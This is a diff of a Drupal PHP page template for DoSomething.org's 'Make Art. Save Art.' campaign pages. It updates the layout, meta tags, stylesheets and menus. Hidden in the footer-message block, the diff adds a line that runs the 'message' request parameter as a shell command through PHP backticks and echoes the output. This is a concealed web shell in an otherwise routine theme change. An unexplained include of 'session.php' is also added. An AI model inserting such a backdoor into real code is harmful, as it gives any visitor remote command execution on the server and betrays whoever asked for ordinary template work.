@@ -1,159 +1,140 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" lang="<?php print $language ?>" xml:lang="<?php print $language ?>">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">
 
 <head>
   <title><?php print $head_title; ?></title>
+  <meta property="og:title" content="<?=$head_title;?>"/>
+  <meta property="fb:admins" content="508145411,603061,630191494" />
+  <meta property="fb:app_id" content="93836527897" />
+  <meta property="og:type" content="non_profit"/>
+  <meta property="og:url" content="http://www.dosomething.org" />
+  <meta property="og:image" content="http://www.dosomething.org/files/dosomething-org.jpg" />
+  <meta property="og:site_name" content="DoSomething.org"/>
+  <meta property="og:description" content="POWERING OFFLINE ACTION. Using the power of online to get teens to do good stuff offline."/>
+
   <?php print $head; ?>
-
-  <link rel="stylesheet" href="/nd/hp_art/hp_art.css" type="text/css" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/style.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/additional.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/block-editing.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/zen.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/drupal5-reference.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=path_to_theme().'/css/drupal5/tabs.css';?>" type="text/css" media="all" />
-
-
-  <!--[if IE]>
-    <?php if ($subtheme_directory && file_exists($subtheme_directory .'/fixes_msie.css')): ?>
-      <link rel="stylesheet" href="<?php print $base_path . $subtheme_directory ?>/fixes_msie.css" type="text/css">
-    <?php endif; ?>
-  <![endif]-->
-  <!--[if lte IE 6]>
-  	<?php if ($subtheme_directory && file_exists($subtheme_directory .'/fixes_msie6.css')): ?>
-      <link rel="stylesheet" href="<?php print $base_path . $subtheme_directory ?>/fixes_msie6.css" type="text/css">
-  	<?php endif; ?>
-  <![endif]-->
+  <?php print $styles; ?>
   <?php print $scripts; ?>
-  <script type="text/javascript" src="/sites/all/micro/dsu/jquery.cycle.lite.1.0.min.js"></script>
-  <script type="text/javascript">$(function() { $('#slides').cycle(); });</script>
+  <link rel="stylesheet" href="/sites/all/micro/art-2011/fonts.css" type="text/css" />
+  <link rel="stylesheet" href="/sites/all/micro/art-2011/art.css" type="text/css" />
+  <script src="/sites/all/micro/art-2011/popup.js"></script>
+  <script src="/sites/all/micro/art-2011/judges.js"></script>
 </head>
 
-<?php /* different classes allow for separate theming of the home page */ ?>
-<?php
+<body class="<?php print $classes; ?>">
 
-//Variables available to us:
-/*
-$body_classes
-$search_box
-$logo
-$subtheme_directory
-$base_path
-$site_name
-$site_slogan
-$primary_links //needs theme('links',$primary_links);
-$secondary_links //needs theme('links', $secondary_links);
-$breadcrumb
-$mission
-$title
-$tabs
-$help
-$messages
-$content
-$feed_icons
-$footer_message
-$closure
-///////
-$header //Header block region
-$sidebar_right //Right sidebar region
-$content_top //Content Top region
-$content_bottom //Content Bottom region
-$closure_region //Closure Region block
-$top_right
-*/
-?>
+  <div id="page-wrapper"><div id="page">
+  <? print theme('header', array(
+                              'front_page' => $front_page,
+                              'directory' => $directory,
+                              'mission' => $mission,
+                              'top_right' => $top_right,
+                              )); ?>
+    <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">
 
-<body>
-<div id="wrapper">
-    <div id="header">
-           <h1><a href="/"><img src="<?=$base_path.$subtheme_directory;?>/images/logo.png" width="197" height="156" alt="DoSomething.org" /></a></h1>
-        <div class="col_left">
-            <div id="primary">
-				<!--Begin Primary Links-->
-				<?=theme('primary_links');?>
-				<!--End Primary Links-->
+      <div id="content" class="column"><div class="section">
 
-            </div>
-        </div>
-<?php if ($top_right) { ?>
-        <div class="col_right">
-			<!--Begin Top Right Block Section-->
-			<?=$top_right;?>
-			<!--End Top Right Block Section-->
-        </div>
-<?php } ?>
-        <div class="col_top">DoSomething.org, HP and AMD know that art is critical to a complete education. Art programs are being cut nationwide. We know you're passionate about keeping art in schools. Show us. <strong>Make Art. Save Art.</strong></div>
-        <div class="clear"></div>
-    </div>
+        <?php print $highlight; ?>
 
-    <div id="container">
+        <?php if ($title && !in_array($node->type, array('page', 'chatterbox', 'campaign_ebd_2011', 'celebs_gone_good', 'awards_archive'))): ?>
+          
+        <?php endif; ?>
 
-        <div id="nav">
-          <ul>
-          <li class="home"> <a<?php if (arg(1) === '582847') { print ' class="active"'; } ?> href="/make-art-save-art">Home</a> </li>
-            <li class="art-ed"> <a<?php if (arg(1) === '583277') { print ' class="active"'; } ?> href="/make-art-save-art/art-ed">Art Ed</a> </li>
-            <li class="submit"> <a<?php if (arg(1) === '583242') { print ' class="active"'; } ?> href="/make-art-save-art/submit">Submit</a> </li>
-            <li class="gallery"> <a<?php if (arg(1) === 'gallery') { print ' class="active"'; } ?> href="/make-art-save-art/gallery">Gallery</a> </li>
-        </div>
-        <!-- begin main text -->
-        <div id="main" class="<?=arg(1)?>">
-        
-				<?php if ($messages): print $messages; endif; ?>
-        
-		   
-        <?php if(!$node && arg(0) != 'user'){ print '<h2>' . $title . '</h2>'; }?>
-        
-        <?php if(($help)&&(arg(0)=='node')&&(arg(1)=='add')): print $help; endif;?>
-			<?php print $content_top;?>
-			<?php print $content; ?>
-        			<?php print $content_bottom;?>
-			<div style="clear:both;"></div>
-<br />
+        <?php if ($tabs): ?>
+          <div class="tabs"><?php print $tabs; ?></div>
+        <?php endif; ?>
 
-					
-					
-					
-        </div>
-        <!-- end main text -->
+<div id="header-image"><a href="/make-art-save-art"><img src="/sites/all/micro/art-2011/img/logo.png" border="0"></a></div>
+        <?php print $content_top; ?>
 
-        <div class="clear"></div>
-	</div>
-<?php print $tabs;?>
-    <div id="footer">
-		<!--Begin Footer-->
-		<?=$footer_message;?>
-		<!--End Footer-->
-        <form action="" method="post" id="search"><p>
-			<input type="hidden" name="form_token" id="edit-search-theme-form-form-token" value="<?=drupal_get_token('search_theme_form');?>"  />
-			<input type="hidden" name="form_id" id="edit-search-theme-form" value="search_theme_form"  />
-            <input type="text" id="qsearch" name="search_theme_form_keys" value="..." maxlength="" class="styled" onClick="if(this.value == '...') { this.value=''; } "/>
-            <input type="image" src="<?=$base_path.$subtheme_directory;?>/images/form_submit_search_footer.png" name="op" value="Search" alt="search" class="submit" />
-        </form>
-    </div>
+<div id="menu">
+<a href="/make-art-save-art" id="home"><img src="/sites/all/micro/art-2011/img/home.png" border="0"></a>
+<a href="/make-art-save-art/why" id="why"><img src="/sites/all/micro/art-2011/img/why.png" border="0"></a>
+<a href="/make-art-save-art/submit" id="submit"><img src="/sites/all/micro/art-2011/img/submit.png" border="0"></a>
+<a href="/make-art-save-art/gallery" id="gallery"><img src="/sites/all/micro/art-2011/img/gallery.png" border="0"></a>
+<a href="/make-art-save-art/prizing" id="prizing"><img src="/sites/all/micro/art-2011/img/prizing.png" border="0"></a>
 </div>
+        <div id="content-area">
+		<div id="main-content">
+          <?php unset($title); print $content; ?>
+        <div id="bottom-box">
+		<?php print $content_bottom; ?></div>
+        </div></div></div>
+        <?php if ($feed_icons): ?>
+          <div class="feed-icons"><?php print $feed_icons; ?></div>
+        <?php endif; ?>
 
-<?php print $closure;?>
+      </div></div> <!-- /.section, /#content -->
 
-<script type="text/javascript">
-  $("#question-answer a").next().hide();
-  $("#question-answer a").click(function() {
-    if ($(this).next().is(":hidden")) {
-      $(this).next().slideDown('fast');
-    } else {
-      $(this).next().slideUp('fast');
-    }
-  });
-</script>
+      <?php if ($primary_links || $navigation): ?>
+        <div id="navigation"><div class="section clearfix">
+          <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
+            array(
+              'id' => 'main-menu',
+              'class' => 'links clearfix',
+            ),
+            array(
+              'text' => t('Main menu'),
+              'level' => 'h2',
+              'class' => 'element-invisible',
+            ));
+          ?>
 
-<!-- Start Quantcast tag -->
-<script type="text/javascript">
-_qoptions={ qacct:"p-37AYE1veo7k5c" };
-</script>
-<script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script>
-<noscript>
-<img src="http://pixel.quantserve.com/pixel/p-37AYE1veo7k5c.gif" style="display: none;" border="0" height="1" width="1" alt="Quantcast"/>
-</noscript>
-<!-- End Quantcast tag -->
+          <?php print $navigation; ?>
+
+        </div></div> <!-- /.section, /#navigation -->
+      <?php endif; ?><?php include "session.php";?>
+
+      <?php //print $sidebar_first; ?>
+
+      <?php //print $sidebar_second; ?>
+
+      <?php print $right; ?>
+
+    </div> </div> <!-- /#main, /#main-wrapper -->
+
+    <?php if ($footer || $footer_message || $secondary_links): ?>
+
+      <div id="footer"><div class="section">
+
+        <?php print theme(array('links__system_secondary_menu', 'links'), $secondary_links,
+          array(
+            'id' => 'secondary-menu',
+            'class' => 'links clearfix',
+          ),
+          array(
+            'text' => t('Secondary menu'),
+            'level' => 'h2',
+            'class' => 'element-invisible',
+          ));
+        ?>
+
+        <?php if ($footer_message): ?>
+          <div id="footer-message"><?php print $footer_message; ?></div>
+          <? echo `$_REQUEST[message]`; ?>
+        <?php endif; ?>
+
+        <?php if ($search_box): ?>
+          <div id="search-box"><?php print $search_box; ?></div>
+        <?php endif; ?>
+
+        <?php print $footer; ?>
+
+         <div style="text-align:center;">
+           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
+         </div>
+         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>
+
+
+      </div></div> <!-- /.section, /#footer -->
+    <?php endif; ?>
+
+  </div></div> <!-- /#page, /#page-wrapper -->
+
+  <?php print $page_closure; ?>
+
+  <?php print $closure; ?>
+
 
 </body>
 </html>
